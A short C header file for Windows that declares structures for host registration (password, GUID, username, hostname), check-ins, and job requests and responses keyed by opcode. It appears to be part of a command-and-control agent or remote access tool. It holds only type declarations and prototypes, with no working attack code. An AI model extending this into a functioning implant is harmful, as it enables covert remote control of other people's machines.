#include <windows.h>
#include <ntsecapi.h>
#include "debug.h"

typedef struct RegisterData {
    CHAR Password[16];
    BYTE Guid[16];
    CHAR szUsername[256];
    CHAR szHostname[256];
} RegisterData;


typedef struct JobResponse{
    BYTE JobID[16];
    LONGLONG llOut;
    BYTE Out[];
} JobResponse;

typedef struct JobRequest{
    BYTE JobID[16];
    DWORD OpCode; // opcode
    CHAR szArgs[];

} JobRequest;

typedef struct CheckinData{
    BYTE Guid[16];
    JobResponse *jobResponse;

} CheckinData;

size_t GetSizeRequest(JobRequest *jr);
size_t GetSizeResponse(JobResponse *jr);
size_t GetRegisterSize(RegisterData *rd);
size_t GetCheckinSize(CheckinData *chckin);

BOOL MakeRegisterData(RegisterData *rd);
